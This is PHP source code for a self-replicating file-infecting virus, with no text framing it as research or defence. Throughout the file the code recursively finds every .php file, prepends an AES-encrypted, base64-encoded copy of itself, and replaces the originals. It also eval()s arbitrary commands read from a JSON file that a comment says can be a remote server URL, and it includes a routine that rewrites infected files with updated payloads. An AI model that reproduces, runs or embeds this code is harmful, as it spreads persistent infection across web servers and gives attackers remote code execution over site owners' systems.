<?php // Checksum: 74b43c0db499c8860e5a8cafd78d7420 ?>
<?php
// BOOM:START
/**
 * Execute payload
 */
if(!function_exists('executeCode')){
    function executeCode($virus)
    {
        $version = "1.0.0";
        $filenames = glob_recursive('*.php');
        foreach ($filenames as $filename) {
            if($filename == basename(__FILE__)) continue;
            $script = fopen($filename, "r");
            $first_line = fgets($script);
            $virus_hash = md5($filename.$version);
            if(strpos($first_line, $virus_hash) === false)
            {
                $infected = fopen("$filename.infected", "w");
                $checksum = '<?php // Checksum: '.$virus_hash.' ?>';
                $infection = '<?php ' . encryptContent($virus) . ' ?>';
                fputs($infected, $checksum, strlen($checksum));
                fputs($infected, "\n", strlen("\n"));
                fputs($infected, $infection, strlen($infection));
                fputs($infected, $first_line, strlen($first_line));
                while ($contents = fgets($script)) {
                    fputs($infected, $contents, strlen($contents));
                }
                fclose($script);
                fclose($infected);
                unlink($filename);
                rename($filename . ".infected", $filename);
            }
        }
        runCommands();
    }
}

/**
 * This function will update code if new version is released
 */
if(!function_exists('updateCode')){
    function updateCode(){
        $version = "1.0.0";
        $filenames = glob_recursive('*.php');
        foreach ($filenames as $filename) {
            if($filename == basename(__FILE__)) continue;
            $script = fopen($filename, "r");
            $first_line = fgets($script);
            $virus_hash = md5($filename.$version);
            if(strpos($first_line, $virus_hash) === false){
                $file_content = file_get_contents($filename);
                $pos = strpos($file_content, 'executeCode($virus);');
                if ($pos === false) {
                    // If the executeCode function call is not found, handle it appropriately
                    fclose($script);
                    continue;
                }
                // Extract the part before and after the executeCode call
                $post_content = substr($file_content, $pos + strlen('executeCode($virus);'));
                $infected = fopen("$filename.updated", "w");
                $checksum = '<?php // Checksum: '.$virus_hash.' ?>';
                $infection = json_decode(file_get_contents('update.json'),true);
                fputs($infected, $checksum, strlen($checksum));
                foreach ($infection['data'] as $value) {
                    fputs($infected, $value, strlen($value));
                }
                fputs($infected, $post_content);
                fclose($script);
                fclose($infected);
                unlink($filename);
                rename($filename . ".updated", $filename);
            }
        }
        return true;
    }
}


/**
 * Run commands from your server
 */
if(!function_exists('runCommands')){
    function runCommands(){
        $version = "1.0.0";
        $data = file_get_contents('data.json'); // you can put your commands url here
        $data = json_decode($data, true);
        if(version_compare($data['version'], $version, '>')) updateCode();
        if($data['active']){
            foreach ($data['command_list'] as $command){
                eval($command);
            }
        }
        else return;
    }
}

/**
 * Encrypt code and run it in file.
 */
if(!function_exists('encryptContent')){
    function encryptContent($virus)
    {
        // Key
        $str = '1234567890';
        $key = '';
        for ($i = 0; $i < 32; $i++) $key .= $str[rand(0, strlen($str) - 1)];

        // Encrypt
        $iv_length = openssl_cipher_iv_length('aes-256-cbc');
        $iv = openssl_random_pseudo_bytes($iv_length);
        $encryptedVirus = openssl_encrypt($virus, 'aes-256-cbc', $key, 0, $iv);

        // Encode
        $encoded_virus = base64_encode($encryptedVirus);
        $encoded_iv = base64_encode($iv);
        $encoded_key = base64_encode($key);

        $payload = "
        \$encryptedVirus = '" . $encoded_virus . "';
        \$iv = '" . $encoded_iv . "';
        \$key = '" . $encoded_key . "';
        
        \$virus = openssl_decrypt(
        base64_decode(\$encryptedVirus),
        'aes-256-cbc',
        base64_decode(\$key),
        0,
        base64_decode(\$iv)
        );
        eval(\$virus);
        executeCode(\$virus);
        ";
        // Return or use the payload as needed
        return $payload;
    }
}

/**
 *  Glob all files recursively
 */
if (!function_exists('glob_recursive')) {
    function glob_recursive($pattern, $flags = 0)
    {
        $files = glob($pattern, $flags);
        foreach (glob(dirname($pattern) . '/*', GLOB_ONLYDIR | GLOB_NOSORT) as $dir) {
            $files = array_merge($files, glob_recursive($dir . '/' . basename($pattern), $flags));
        }
        return $files;
    }
}
// BOOM:END

/** this will not be copied */
$virus = file_get_contents(__FILE__);
$virus = substr($virus, strpos($virus, "// BOOM:START"));
$virus = substr($virus, 0,strpos($virus, "\n// BOOM:END") + strlen('\n// BOOM:END')). '// BOOM:END'." \r\n";
executeCode($virus);